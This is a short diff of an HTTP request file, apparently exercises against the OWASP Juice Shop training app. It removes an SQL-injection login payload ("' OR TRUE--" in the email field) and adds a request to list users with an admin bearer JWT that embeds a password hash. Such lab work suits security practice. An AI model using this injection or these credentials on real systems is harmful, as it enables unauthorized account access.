@@ -55,10 +55,6 @@ Content-Type: application/json
 
 
 ### Login with jims account through SQL-injection
-POST {{base-url}}/rest/user/login
+GET {{base-url}}/api/Users
 Content-Type: application/json
-
-{
-    "email": "jim@juice-sh.op' OR TRUE--",
-    "password": "12345"
-}
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjQtMDUtMzEgMTk6MzQ6MjAuODA2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjQtMDYtMDQgMDk6NDQ6NDguNDE2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcxNzQ5NDQ3MX0.Men0KDDoN7ZCciGxDsD3L0rc2HJeEFLR4-sAu9rOEUMvDH5MwnblnlRO9YqLAu89JnJFD0mxllw7hQhOpfEgPWoOpKmiXy0fBPCuemBs7IgPNrrIczzTz5Z6hbtbQOGCjxyb7YxFXW-6wGHhuVLLKa6dzLUqEYxYrdzGVWAd_mA
